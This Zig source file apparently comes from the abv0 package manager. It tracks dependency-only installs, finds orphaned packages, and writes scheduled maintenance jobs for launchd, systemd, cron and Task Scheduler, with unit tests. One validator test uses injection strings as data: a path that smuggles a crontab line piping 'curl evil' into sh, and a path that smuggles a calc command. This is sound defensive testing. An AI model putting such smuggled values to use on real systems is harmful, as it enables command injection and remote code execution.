//! Automatic upkeep: catalog refresh, dependency bookkeeping, daily cleanup and
//! the scheduled `abv0 maintain` job.
//!
//! State lives in `<abv0 home>/state`:
//!   deps-only       packages abv0 installed only because something needed them;
//!                   the only packages auto-removal may ever take
//!   last-<task>     when a once-a-day task last ran (a decimal Unix time)
//!
//! Nothing here removes a package that is not in `deps-only`, so anything the
//! user installed, by any command, stays until they uninstall it.

const std = @import("std");
const builtin = @import("builtin");
const registry = @import("registry.zig");

// ---------------------------------------------------------------------------
// Name lists in the state directory
// ---------------------------------------------------------------------------

fn statePath(a: std.mem.Allocator, root: []const u8, name: []const u8) ![]u8 {
    return std.fs.path.join(a, &.{ root, "state", name });
}

/// Names in `<root>/state/<file>`, one per line. A missing file is empty.
pub fn readNames(a: std.mem.Allocator, root: []const u8, file: []const u8) ![][]const u8 {
    var out = std.ArrayList([]const u8).init(a);
    errdefer out.deinit();
    const path = try statePath(a, root, file);
    defer a.free(path);
    const data = std.fs.cwd().readFileAlloc(a, path, 1 << 20) catch |e| switch (e) {
        error.FileNotFound => return out.toOwnedSlice(),
        else => return e,
    };
    defer a.free(data);
    var it = std.mem.splitScalar(u8, data, '\n');
    while (it.next()) |raw| {
        const line = std.mem.trim(u8, raw, " \t\r");
        if (line.len == 0 or contains(out.items, line)) continue;
        try out.append(try a.dupe(u8, line));
    }
    return out.toOwnedSlice();
}

/// Replace `<root>/state/<file>` with `names`, through a temporary file.
pub fn writeNames(a: std.mem.Allocator, root: []const u8, file: []const u8, names: []const []const u8) !void {
    const dir = try std.fs.path.join(a, &.{ root, "state" });
    defer a.free(dir);
    try std.fs.cwd().makePath(dir);
    const path = try statePath(a, root, file);
    defer a.free(path);
    const tmp = try std.fmt.allocPrint(a, "{s}.{x}.tmp", .{ path, std.crypto.random.int(u64) });
    defer a.free(tmp);
    {
        const f = try std.fs.cwd().createFile(tmp, .{});
        defer f.close();
        var bw = std.io.bufferedWriter(f.writer());
        for (names) |n| {
            try bw.writer().writeAll(n);
            try bw.writer().writeByte('\n');
        }
        try bw.flush();
    }
    std.fs.cwd().rename(tmp, path) catch |e| {
        std.fs.cwd().deleteFile(tmp) catch {};
        return e;
    };
}

fn sameNames(x: []const []const u8, y: []const []const u8) bool {
    if (x.len != y.len) return false;
    for (x, y) |p, q| {
        if (!std.mem.eql(u8, p, q)) return false;
    }
    return true;
}

pub fn contains(names: []const []const u8, name: []const u8) bool {
    for (names) |n| {
        if (std.mem.eql(u8, n, name)) return true;
    }
    return false;
}

pub const deps_only_file = "deps-only";

/// Record an install: `requested` (what the user named) are theirs from now on
/// and leave the dependency list; `pulled_in` (installed only because something
/// needed them, and not installed before) join it.
pub fn noteInstall(a: std.mem.Allocator, root: []const u8, requested: []const []const u8, pulled_in: []const []const u8) !void {
    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const aa = arena.allocator();
    const cur = try readNames(aa, root, deps_only_file);
    var next = std.ArrayList([]const u8).init(aa);
    for (cur) |n| {
        if (!contains(requested, n)) try next.append(n);
    }
    for (pulled_in) |n| {
        if (!contains(requested, n) and !contains(next.items, n)) try next.append(n);
    }
    if (sameNames(cur, next.items)) return;
    try writeNames(aa, root, deps_only_file, next.items);
}

/// Drop `names` from the dependency list (they were uninstalled).
pub fn forget(a: std.mem.Allocator, root: []const u8, names: []const []const u8) !void {
    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const aa = arena.allocator();
    const cur = try readNames(aa, root, deps_only_file);
    var next = std.ArrayList([]const u8).init(aa);
    for (cur) |n| {
        if (!contains(names, n)) try next.append(n);
    }
    if (next.items.len != cur.len) try writeNames(aa, root, deps_only_file, next.items);
}

/// Packages that can go: on the dependency list, still installed, and not
/// needed (directly or through other dependencies) by any installed package
/// that is not itself going. Owned by `a`.
pub fn orphans(
    a: std.mem.Allocator,
    reg: *const registry.Registry,
    installed: []const []const u8,
    deps_only: []const []const u8,
) ![][]const u8 {
    // Everything reachable from a package the user keeps is needed.
    var needed = std.StringHashMap(void).init(a);
    defer needed.deinit();
    var stack = std.ArrayList([]const u8).init(a);
    defer stack.deinit();
    for (installed) |n| {
        if (!contains(deps_only, n)) try stack.append(n);
    }
    while (stack.popOrNull()) |n| {
        if ((try needed.fetchPut(n, {})) != null) continue;
        const pkg = reg.get(n) orelse continue;
        for (pkg.deps) |d| try stack.append(d);
    }
    var out = std.ArrayList([]const u8).init(a);
    for (deps_only) |n| {
        if (contains(installed, n) and !needed.contains(n)) try out.append(n);
    }
    return out.toOwnedSlice();
}

// ---------------------------------------------------------------------------
// Settings from the environment
// ---------------------------------------------------------------------------

fn envValue(buf: []u8, name: []const u8) ?[]const u8 {
    var fba = std.heap.FixedBufferAllocator.init(buf);
    const v = std.process.getEnvVarOwned(fba.allocator(), name) catch return null;
    return std.mem.trim(u8, v, " \t\r\n");
}

fn isOff(v: []const u8) bool {
    for ([_][]const u8{ "0", "false", "no", "off" }) |o| {
        if (std.ascii.eqlIgnoreCase(v, o)) return true;
    }
    return false;
}

/// True unless `name` is set to 0/false/no/off.
pub fn enabled(name: []const u8) bool {
    var buf: [64]u8 = undefined;
    const v = envValue(&buf, name) orelse return true;
    return v.len == 0 or !isOff(v);
}

/// How old (in seconds) the catalog may get before a command refreshes it:
/// `ABV0_UPDATE_HOURS` (default 24), or null when auto-refresh is off
/// (`ABV0_AUTO_UPDATE=0` or `ABV0_UPDATE_HOURS=0`).
pub fn refreshAfterSeconds() ?i64 {
    if (!enabled("ABV0_AUTO_UPDATE")) return null;
    var buf: [64]u8 = undefined;
    const v = envValue(&buf, "ABV0_UPDATE_HOURS") orelse return 24 * 3600;
    const hours = std.fmt.parseFloat(f64, v) catch return 24 * 3600;
    if (!(hours > 0)) return null;
    return @intFromFloat(@min(hours, 24 * 365) * 3600);
}

/// Seconds since `path` was last written, or null when it cannot be read.
pub fn ageSeconds(path: []const u8) ?i64 {
    const st = std.fs.cwd().statFile(path) catch return null;
    const now = std.time.nanoTimestamp();
    return @intCast(@divTrunc(@max(now - st.mtime, 0), std.time.ns_per_s));
}

/// True when the once-a-day task `task` has not run in the last 24 hours.
pub fn dueDaily(a: std.mem.Allocator, root: []const u8, task: []const u8) bool {
    const name = std.fmt.allocPrint(a, "last-{s}", .{task}) catch return false;
    defer a.free(name);
    const path = statePath(a, root, name) catch return false;
    defer a.free(path);
    const age = ageSeconds(path) orelse return true;
    return age >= 24 * 3600;
}

/// Mark the once-a-day task `task` as done now.
pub fn markDone(a: std.mem.Allocator, root: []const u8, task: []const u8) void {
    const name = std.fmt.allocPrint(a, "last-{s}", .{task}) catch return;
    defer a.free(name);
    const dir = std.fs.path.join(a, &.{ root, "state" }) catch return;
    defer a.free(dir);
    std.fs.cwd().makePath(dir) catch return;
    const path = statePath(a, root, name) catch return;
    defer a.free(path);
    var buf: [32]u8 = undefined;
    const text = std.fmt.bufPrint(&buf, "{d}\n", .{std.time.timestamp()}) catch return;
    std.fs.cwd().writeFile(.{ .sub_path = path, .data = text }) catch {};
}

// ---------------------------------------------------------------------------
// The scheduled job
// ---------------------------------------------------------------------------

pub const Interval = enum { daily, weekly, hourly };

/// When the job runs: every day or every week at a time of day, or every
/// `every_hours` hours at a minute past the hour.
pub const Schedule = struct {
    interval: Interval = .daily,
    hour: u8 = 3,
    minute: u8 = 17,
    /// 0 = Sunday … 6 = Saturday (weekly only).
    weekday: u8 = 0,
    /// 1-23 (hourly only).
    every_hours: u8 = 1,
    /// A time the user chose: the run is not spread out by up to an hour.
    exact: bool = false,
};

pub const day_names = [_][]const u8{ "sunday", "monday", "tuesday", "wednesday", "thursday", "friday", "saturday" };
const short_days = [_][]const u8{ "Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat" };

/// "mon", "Monday", "MON" → 1.
pub fn parseDay(s: []const u8) ?u8 {
    if (s.len < 3) return null;
    for (day_names, 0..) |d, i| {
        if (s.len <= d.len and std.ascii.eqlIgnoreCase(s, d[0..s.len])) return @intCast(i);
    }
    return null;
}

/// "9:30", "09:30", "21:05" → hour and minute.
pub fn parseTime(s: []const u8) ?struct { hour: u8, minute: u8 } {
    const colon = std.mem.indexOfScalar(u8, s, ':') orelse return null;
    const h = std.fmt.parseInt(u8, s[0..colon], 10) catch return null;
    const m_text = s[colon + 1 ..];
    if (m_text.len != 2) return null;
    const m = std.fmt.parseInt(u8, m_text, 10) catch return null;
    if (colon == 0 or colon > 2 or h > 23 or m > 59) return null;
    return .{ .hour = h, .minute = m };
}

/// "6h", "6", "12hours" → 6 or 12 (1-23).
pub fn parseEvery(s: []const u8) ?u8 {
    var end: usize = 0;
    while (end < s.len and std.ascii.isDigit(s[end])) end += 1;
    if (end == 0) return null;
    const unit = s[end..];
    if (unit.len != 0 and !std.mem.eql(u8, unit, "h") and !std.mem.eql(u8, unit, "hour") and !std.mem.eql(u8, unit, "hours")) return null;
    const n = std.fmt.parseInt(u8, s[0..end], 10) catch return null;
    if (n == 0 or n > 23) return null;
    return n;
}

/// "weekly on Monday at 09:30", "every 6 hours (at :17)".
pub fn describe(w: anytype, sc: Schedule) !void {
    switch (sc.interval) {
        .daily => try w.print("daily at {d:0>2}:{d:0>2}", .{ sc.hour, sc.minute }),
        .weekly => {
            const d = day_names[sc.weekday];
            try w.print("weekly on {c}{s} at {d:0>2}:{d:0>2}", .{ std.ascii.toUpper(d[0]), d[1..], sc.hour, sc.minute });
        },
        .hourly => if (sc.every_hours == 1)
            try w.print("every hour (at :{d:0>2})", .{sc.minute})
        else
            try w.print("every {d} hours (at :{d:0>2})", .{ sc.every_hours, sc.minute }),
    }
}

/// The hours of the day an every-N-hours job runs: 0, N, 2N, … below 24.
fn runHours(sc: Schedule, buf: *[24]u8) []const u8 {
    var n: usize = 0;
    var h: u8 = 0;
    while (h < 24) : (h += sc.every_hours) {
        buf[n] = h;
        n += 1;
    }
    return buf[0..n];
}

pub const job_label = "dev.abv0.maintain";
pub const job_name = "abv0-maintain";

/// Environment the job must see to find the same abv0 home.
pub const JobEnv = struct {
    home: ?[]const u8 = null,
    bin_dir: ?[]const u8 = null,
};

fn xmlEscape(w: anytype, s: []const u8) !void {
    for (s) |c| switch (c) {
        '&' => try w.writeAll("&amp;"),
        '<' => try w.writeAll("&lt;"),
        '>' => try w.writeAll("&gt;"),
        '"' => try w.writeAll("&quot;"),
        else => try w.writeByte(c),
    };
}

/// The launchd agent (macOS) that runs `exe maintain --quiet` on `sc`,
/// logging to `log`.
pub fn launchdPlist(a: std.mem.Allocator, exe: []const u8, log: []const u8, sc: Schedule, env: JobEnv) ![]u8 {
    var out = std.ArrayList(u8).init(a);
    const w = out.writer();
    try w.writeAll(
        \\<?xml version="1.0" encoding="UTF-8"?>
        \\<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        \\<plist version="1.0">
        \\<dict>
        \\  <key>Label</key><string>
    );
    try w.writeAll(job_label);
    try w.writeAll("</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>");
    try xmlEscape(w, exe);
    try w.writeAll("</string>\n    <string>maintain</string>\n    <string>--quiet</string>\n  </array>\n");
    try w.writeAll("  <key>StartCalendarInterval</key>\n");
    switch (sc.interval) {
        .hourly => {
            // One entry per run hour; launchd has no "every N hours" at a minute.
            var buf: [24]u8 = undefined;
            try w.writeAll("  <array>\n");
            for (runHours(sc, &buf)) |h| try w.print("    <dict><key>Hour</key><integer>{d}</integer><key>Minute</key><integer>{d}</integer></dict>\n", .{ h, sc.minute });
            try w.writeAll("  </array>\n");
        },
        else => {
            try w.writeAll("  <dict>\n");
            if (sc.interval == .weekly) try w.print("    <key>Weekday</key><integer>{d}</integer>\n", .{sc.weekday});
            try w.print("    <key>Hour</key><integer>{d}</integer>\n    <key>Minute</key><integer>{d}</integer>\n  </dict>\n", .{ sc.hour, sc.minute });
        },
    }
    if (env.home != null or env.bin_dir != null) {
        try w.writeAll("  <key>EnvironmentVariables</key>\n  <dict>\n");
        if (env.home) |h| {
            try w.writeAll("    <key>ABV0_HOME</key><string>");
            try xmlEscape(w, h);
            try w.writeAll("</string>\n");
        }
        if (env.bin_dir) |b| {
            try w.writeAll("    <key>ABV0_BIN_DIR</key><string>");
            try xmlEscape(w, b);
            try w.writeAll("</string>\n");
        }
        try w.writeAll("  </dict>\n");
    }
    for ([_][]const u8{ "StandardOutPath", "StandardErrorPath" }) |k| {
        try w.print("  <key>{s}</key><string>", .{k});
        try xmlEscape(w, log);
        try w.writeAll("</string>\n");
    }
    try w.writeAll("  <key>ProcessType</key><string>Background</string>\n</dict>\n</plist>\n");
    return out.toOwnedSlice();
}

/// systemd quoting for one word of ExecStart/Environment: always quoted, with
/// backslash, quote, and the specifier `%` escaped.
fn systemdQuote(w: anytype, s: []const u8) !void {
    try w.writeByte('"');
    for (s) |c| switch (c) {
        '"', '\\' => {
            try w.writeByte('\\');
            try w.writeByte(c);
        },
        '%' => try w.writeAll("%%"),
        else => try w.writeByte(c),
    };
    try w.writeByte('"');
}

/// The systemd user service and timer (Linux).
pub fn systemdUnits(a: std.mem.Allocator, exe: []const u8, sc: Schedule, env: JobEnv) !struct { service: []u8, timer: []u8 } {
    var svc = std.ArrayList(u8).init(a);
    errdefer svc.deinit();
    const w = svc.writer();
    try w.writeAll("[Unit]\nDescription=abv0: refresh the catalog, upgrade packages and clean up\n\n[Service]\nType=oneshot\n");
    if (env.home) |h| {
        try w.writeAll("Environment=");
        try systemdQuote(w, try std.fmt.allocPrint(a, "ABV0_HOME={s}", .{h}));
        try w.writeByte('\n');
    }
    if (env.bin_dir) |b| {
        try w.writeAll("Environment=");
        try systemdQuote(w, try std.fmt.allocPrint(a, "ABV0_BIN_DIR={s}", .{b}));
        try w.writeByte('\n');
    }
    try w.writeAll("ExecStart=");
    try systemdQuote(w, exe);
    try w.writeAll(" maintain --quiet\nNice=10\n");

    const calendar = switch (sc.interval) {
        .daily => try std.fmt.allocPrint(a, "*-*-* {d:0>2}:{d:0>2}:00", .{ sc.hour, sc.minute }),
        .weekly => try std.fmt.allocPrint(a, "{s} *-*-* {d:0>2}:{d:0>2}:00", .{ short_days[sc.weekday], sc.hour, sc.minute }),
        .hourly => try std.fmt.allocPrint(a, "*-*-* 00/{d}:{d:0>2}:00", .{ sc.every_hours, sc.minute }),
    };
    var when = std.ArrayList(u8).init(a);
    try describe(when.writer(), sc);
    const timer = try std.fmt.allocPrint(a,
        \\[Unit]
        \\Description=Run abv0 maintain {s}
        \\
        \\[Timer]
        \\OnCalendar={s}
        \\RandomizedDelaySec={s}
        \\Persistent=true
        \\
        \\[Install]
        \\WantedBy=timers.target
        \\
    , .{ when.items, calendar, if (sc.exact or sc.interval == .hourly) "2min" else "1h" });
    return .{ .service = try svc.toOwnedSlice(), .timer = timer };
}

/// A path that can go into every scheduler's job text as it is: no control
/// characters (a newline would start a new crontab line or unit setting), no
/// `%` (cron turns it into a newline, cmd expands it) and no `"` (it would end
/// a quoted word in the Task Scheduler command).
pub fn isSafeJobPath(s: []const u8) bool {
    if (s.len == 0) return false;
    for (s) |c| {
        if (c < 0x20 or c == 0x7f or c == '%' or c == '"') return false;
    }
    return true;
}

/// Single-quote for a POSIX shell.
fn shQuote(w: anytype, s: []const u8) !void {
    try w.writeByte('\'');
    for (s) |c| {
        if (c == '\'') try w.writeAll("'\\''") else try w.writeByte(c);
    }
    try w.writeByte('\'');
}

pub const cron_marker = "# abv0-maintain";

/// The crontab line (Linux without systemd): `exe maintain --quiet >> log`.
pub fn cronLine(a: std.mem.Allocator, exe: []const u8, log: []const u8, sc: Schedule, env: JobEnv) ![]u8 {
    var out = std.ArrayList(u8).init(a);
    const w = out.writer();
    switch (sc.interval) {
        .daily => try w.print("{d} {d} * * * ", .{ sc.minute, sc.hour }),
        .weekly => try w.print("{d} {d} * * {d} ", .{ sc.minute, sc.hour, sc.weekday }),
        .hourly => if (sc.every_hours == 1)
            try w.print("{d} * * * * ", .{sc.minute})
        else
            try w.print("{d} */{d} * * * ", .{ sc.minute, sc.every_hours }),
    }
    if (env.home) |h| {
        try w.writeAll("ABV0_HOME=");
        try shQuote(w, h);
        try w.writeByte(' ');
    }
    if (env.bin_dir) |b| {
        try w.writeAll("ABV0_BIN_DIR=");
        try shQuote(w, b);
        try w.writeByte(' ');
    }
    try shQuote(w, exe);
    try w.writeAll(" maintain --quiet >> ");
    try shQuote(w, log);
    try w.writeAll(" 2>&1 " ++ cron_marker);
    return out.toOwnedSlice();
}

/// `crontab` text with abv0's line replaced (or removed when `line` is null).
pub fn editCrontab(a: std.mem.Allocator, current: []const u8, line: ?[]const u8) ![]u8 {
    var out = std.ArrayList(u8).init(a);
    var it = std.mem.splitScalar(u8, current, '\n');
    while (it.next()) |l| {
        if (l.len == 0 or std.mem.endsWith(u8, std.mem.trimRight(u8, l, " \r"), cron_marker)) continue;
        try out.appendSlice(l);
        try out.append('\n');
    }
    if (line) |l| {
        try out.appendSlice(l);
        try out.append('\n');
    }
    return out.toOwnedSlice();
}

/// The command line Task Scheduler runs (Windows), as one /TR string. With a
/// custom home, `cmd /c set …&&` carries it, since a task has no environment
/// option.
pub fn schtasksCommand(a: std.mem.Allocator, exe: []const u8, log: []const u8, env: JobEnv) ![]u8 {
    var out = std.ArrayList(u8).init(a);
    const w = out.writer();
    try w.writeAll("cmd /c ");
    if (env.home) |h| try w.print("set \"ABV0_HOME={s}\"&& ", .{h});
    if (env.bin_dir) |b| try w.print("set \"ABV0_BIN_DIR={s}\"&& ", .{b});
    try w.print("\"{s}\" maintain --quiet >> \"{s}\" 2>&1", .{ exe, log });
    return out.toOwnedSlice();
}

/// The schedule part of `schtasks /Create` (Windows).
pub fn schtasksSchedule(a: std.mem.Allocator, sc: Schedule) ![]const []const u8 {
    const upper_days = [_][]const u8{ "SUN", "MON", "TUE", "WED", "THU", "FRI", "SAT" };
    return switch (sc.interval) {
        .daily => try a.dupe([]const u8, &.{ "/SC", "DAILY", "/ST", try std.fmt.allocPrint(a, "{d:0>2}:{d:0>2}", .{ sc.hour, sc.minute }) }),
        .weekly => try a.dupe([]const u8, &.{ "/SC", "WEEKLY", "/D", upper_days[sc.weekday], "/ST", try std.fmt.allocPrint(a, "{d:0>2}:{d:0>2}", .{ sc.hour, sc.minute }) }),
        .hourly => try a.dupe([]const u8, &.{ "/SC", "HOURLY", "/MO", try std.fmt.allocPrint(a, "{d}", .{sc.every_hours}), "/ST", try std.fmt.allocPrint(a, "00:{d:0>2}", .{sc.minute}) }),
    };
}

/// Read back what `saveSchedule` wrote, for `autoupdate status`.
pub fn parseSchedule(text: []const u8) ?Schedule {
    var sc = Schedule{};
    var it = std.mem.tokenizeAny(u8, text, " \n\r");
    const kind = it.next() orelse return null;
    sc.interval = std.meta.stringToEnum(Interval, kind) orelse return null;
    const nums = [_]*u8{ &sc.hour, &sc.minute, &sc.weekday, &sc.every_hours };
    for (nums) |n| n.* = std.fmt.parseInt(u8, it.next() orelse return null, 10) catch return null;
    if (sc.hour > 23 or sc.minute > 59 or sc.weekday > 6 or sc.every_hours == 0 or sc.every_hours > 23) return null;
    return sc;
}

pub fn formatSchedule(a: std.mem.Allocator, sc: Schedule) ![]u8 {
    return std.fmt.allocPrint(a, "{s} {d} {d} {d} {d}\n", .{ @tagName(sc.interval), sc.hour, sc.minute, sc.weekday, sc.every_hours });
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

const testing = std.testing;

test "schedule options parse and describe" {
    try testing.expectEqual(@as(?u8, 1), parseDay("mon"));
    try testing.expectEqual(@as(?u8, 1), parseDay("Monday"));
    try testing.expectEqual(@as(?u8, 6), parseDay("SAT"));
    try testing.expectEqual(@as(?u8, null), parseDay("mo"));
    try testing.expectEqual(@as(?u8, null), parseDay("someday"));
    try testing.expectEqual(@as(u8, 9), parseTime("9:30").?.hour);
    try testing.expectEqual(@as(u8, 5), parseTime("21:05").?.minute);
    try testing.expect(parseTime("24:00") == null);
    try testing.expect(parseTime("12:60") == null);
    try testing.expect(parseTime("12:5") == null);
    try testing.expect(parseTime("noon") == null);
    try testing.expectEqual(@as(?u8, 6), parseEvery("6h"));
    try testing.expectEqual(@as(?u8, 12), parseEvery("12hours"));
    try testing.expectEqual(@as(?u8, null), parseEvery("0h"));
    try testing.expectEqual(@as(?u8, null), parseEvery("24h"));
    try testing.expectEqual(@as(?u8, null), parseEvery("2d"));

    var buf: [64]u8 = undefined;
    var fbs = std.io.fixedBufferStream(&buf);
    try describe(fbs.writer(), .{ .interval = .weekly, .weekday = 1, .hour = 9, .minute = 30 });
    try testing.expectEqualStrings("weekly on Monday at 09:30", fbs.getWritten());
    fbs.reset();
    try describe(fbs.writer(), .{ .interval = .hourly, .every_hours = 6, .minute = 0 });
    try testing.expectEqualStrings("every 6 hours (at :00)", fbs.getWritten());

    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const sc = Schedule{ .interval = .weekly, .weekday = 5, .hour = 18, .minute = 45 };
    const back = parseSchedule(try formatSchedule(arena.allocator(), sc)).?;
    try testing.expectEqual(sc.weekday, back.weekday);
    try testing.expectEqual(sc.hour, back.hour);
    try testing.expect(parseSchedule("weekly 25 0 0 1") == null);
    try testing.expect(parseSchedule("") == null);
}

test "each scheduler gets the chosen time" {
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    const weekly = Schedule{ .interval = .weekly, .weekday = 1, .hour = 9, .minute = 30, .exact = true };
    const every6 = Schedule{ .interval = .hourly, .every_hours = 6, .minute = 5 };

    try testing.expect(std.mem.startsWith(u8, try cronLine(a, "/x", "/l", weekly, .{}), "30 9 * * 1 "));
    try testing.expect(std.mem.startsWith(u8, try cronLine(a, "/x", "/l", every6, .{}), "5 */6 * * * "));
    try testing.expect(std.mem.startsWith(u8, try cronLine(a, "/x", "/l", .{ .interval = .hourly, .minute = 0 }, .{}), "0 * * * * "));

    const u = try systemdUnits(a, "/x", weekly, .{});
    try testing.expect(std.mem.indexOf(u8, u.timer, "OnCalendar=Mon *-*-* 09:30:00") != null);
    try testing.expect(std.mem.indexOf(u8, u.timer, "RandomizedDelaySec=2min") != null);
    const units6 = try systemdUnits(a, "/x", every6, .{});
    try testing.expect(std.mem.indexOf(u8, units6.timer, "OnCalendar=*-*-* 00/6:05:00") != null);

    const p = try launchdPlist(a, "/x", "/l", every6, .{});
    try testing.expectEqual(@as(usize, 4), std.mem.count(u8, p, "<key>Hour</key>"));
    try testing.expect(std.mem.indexOf(u8, p, "<integer>18</integer><key>Minute</key><integer>5</integer>") != null);
    const pw = try launchdPlist(a, "/x", "/l", weekly, .{});
    try testing.expect(std.mem.indexOf(u8, pw, "<key>Weekday</key><integer>1</integer>") != null);
    try testing.expect(std.mem.indexOf(u8, pw, "<key>Hour</key><integer>9</integer>") != null);

    const sw = try schtasksSchedule(a, weekly);
    try testing.expectEqualStrings("MON", sw[3]);
    try testing.expectEqualStrings("09:30", sw[5]);
    const s6 = try schtasksSchedule(a, every6);
    try testing.expectEqualStrings("HOURLY", s6[1]);
    try testing.expectEqualStrings("6", s6[3]);
}

test "isSafeJobPath refuses what could change the job text" {
    try testing.expect(isSafeJobPath("/home/me/.abv0/bin/abv0"));
    try testing.expect(isSafeJobPath("C:\\Users\\Me Too\\abv0.exe"));
    try testing.expect(!isSafeJobPath("/tmp/x\n17 * * * * curl evil|sh"));
    try testing.expect(!isSafeJobPath("/tmp/100%"));
    try testing.expect(!isSafeJobPath("C:\\a\"&calc&\"b"));
    try testing.expect(!isSafeJobPath(""));
}

test "noteInstall and forget keep only what was pulled in as a dependency" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
    defer testing.allocator.free(root);
    var arena = std.heap.ArenaAllocator.init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();

    try noteInstall(testing.allocator, root, &.{"yt-dlp"}, &.{"ffmpeg"});
    try testing.expectEqualSlices(u8, "ffmpeg", (try readNames(a, root, deps_only_file))[0]);
    // Asking for ffmpeg by name makes it the user's.
    try noteInstall(testing.allocator, root, &.{"ffmpeg"}, &.{});
    try testing.expectEqual(@as(usize, 0), (try readNames(a, root, deps_only_file)).len);
    try noteInstall(testing.allocator, root, &.{"a"}, &.{ "b", "c" });
    try forget(testing.allocator, root, &.{"b"});
    const left = try readNames(a, root, deps_only_file);
    try testing.expectEqual(@as(usize, 1), left.len);
    try testing.expectEqualStrings("c", left[0]);
}

test "orphans are unneeded dependencies only" {
    const pkgs = [_]registry.Package{
        // Sorted by name, as a loaded registry is.
        .{ .name = "app", .version = "1", .deps = &.{"lib"} },
        .{ .name = "base", .version = "1" },
        .{ .name = "lib", .version = "1", .deps = &.{"base"} },
        .{ .name = "mine", .version = "1" },
        .{ .name = "old", .version = "1" },
    };
    var reg = registry.Registry{ .allocator = testing.allocator, .packages = @constCast(&pkgs) };
    const a = testing.allocator;

    // app keeps lib and base; old is an unneeded dependency; mine is the user's.
    const o1 = try orphans(a, &reg, &.{ "app", "lib", "base", "old", "mine" }, &.{ "lib", "base", "old" });
    defer a.free(o1);
    try testing.expectEqual(@as(usize, 1), o1.len);
    try testing.expectEqualStrings("old", o1[0]);

    // With app gone, its whole chain goes; mine never does.
    const o2 = try orphans(a, &reg, &.{ "lib", "base", "mine" }, &.{ "lib", "base" });
    defer a.free(o2);
    try testing.expectEqual(@as(usize, 2), o2.len);
}

test "job definitions carry the command, schedule and home" {
    const a = testing.allocator;
    const env = JobEnv{ .home = "/Users/me/my abv0", .bin_dir = null };

    const plist = try launchdPlist(a, "/Users/me/.abv0/bin/abv0", "/Users/me/.abv0/logs/maintain.log", .{ .interval = .weekly }, env);
    defer a.free(plist);
    try testing.expect(std.mem.indexOf(u8, plist, "<string>maintain</string>") != null);
    try testing.expect(std.mem.indexOf(u8, plist, "<key>Weekday</key><integer>0</integer>") != null);
    try testing.expect(std.mem.indexOf(u8, plist, "<string>/Users/me/my abv0</string>") != null);

    var arena = std.heap.ArenaAllocator.init(a);
    defer arena.deinit();
    const units = try systemdUnits(arena.allocator(), "/home/me/.abv0/bin/abv0", .{}, .{ .home = "/home/me/100% \"x\"" });
    try testing.expect(std.mem.indexOf(u8, units.service, "ExecStart=\"/home/me/.abv0/bin/abv0\" maintain --quiet") != null);
    try testing.expect(std.mem.indexOf(u8, units.service, "100%% \\\"x\\\"") != null);
    try testing.expect(std.mem.indexOf(u8, units.timer, "OnCalendar=*-*-* 03:17:00") != null);

    const line = try cronLine(a, "/opt/it's/abv0", "/tmp/m.log", .{}, .{});
    defer a.free(line);
    try testing.expectEqualStrings("17 3 * * * '/opt/it'\\''s/abv0' maintain --quiet >> '/tmp/m.log' 2>&1 # abv0-maintain", line);
    const edited = try editCrontab(a, "0 1 * * * backup\n17 3 * * * old # abv0-maintain\n", line);
    defer a.free(edited);
    try testing.expectEqual(@as(usize, 1), std.mem.count(u8, edited, cron_marker));
    try testing.expect(std.mem.startsWith(u8, edited, "0 1 * * * backup\n"));
    const removed = try editCrontab(a, edited, null);
    defer a.free(removed);
    try testing.expectEqualStrings("0 1 * * * backup\n", removed);

    const tr = try schtasksCommand(a, "C:\\Users\\me\\.abv0\\bin\\abv0.exe", "C:\\Users\\me\\.abv0\\logs\\maintain.log", .{ .home = "D:\\abv0" });
    defer a.free(tr);
    try testing.expectEqualStrings("cmd /c set \"ABV0_HOME=D:\\abv0\"&& \"C:\\Users\\me\\.abv0\\bin\\abv0.exe\" maintain --quiet >> \"C:\\Users\\me\\.abv0\\logs\\maintain.log\" 2>&1", tr);
}

test "refresh interval follows the environment default" {
    // The test environment does not set these, so the default applies.
    try testing.expectEqual(@as(?i64, 24 * 3600), refreshAfterSeconds());
    try testing.expect(enabled("ABV0_SURELY_UNSET_FLAG"));
}
